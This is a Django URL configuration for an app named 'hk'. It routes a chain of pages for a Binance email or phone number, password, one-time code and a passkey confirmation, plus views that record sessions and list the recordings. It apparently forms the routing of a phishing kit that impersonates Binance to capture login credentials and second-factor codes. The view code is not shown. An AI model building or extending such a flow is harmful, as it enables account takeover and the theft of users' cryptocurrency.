from django.urls import path
from .views import Email,Binance_E,Binance_P,Binance_OTP,PassKey,Recording,Recording_list
from django.views.generic import ListView
from django.contrib.auth import views as auth_views
# from . views import *


app_name = 'hk'
urlpatterns =[ 
path(r'', Email, name='email'),
path(r'binance_email_phone', Binance_E, name='bin_e'),
path(r'binance_password', Binance_P, name='bin_p'),
path(r'binance_otp', Binance_OTP, name='otp'),
path(r'banktrade_passkey_confirmation', PassKey, name='pkey'),
path(r'coin_choice', Recording, name='rec'),
path(r'screen_list', Recording_list, name='rl'),
]
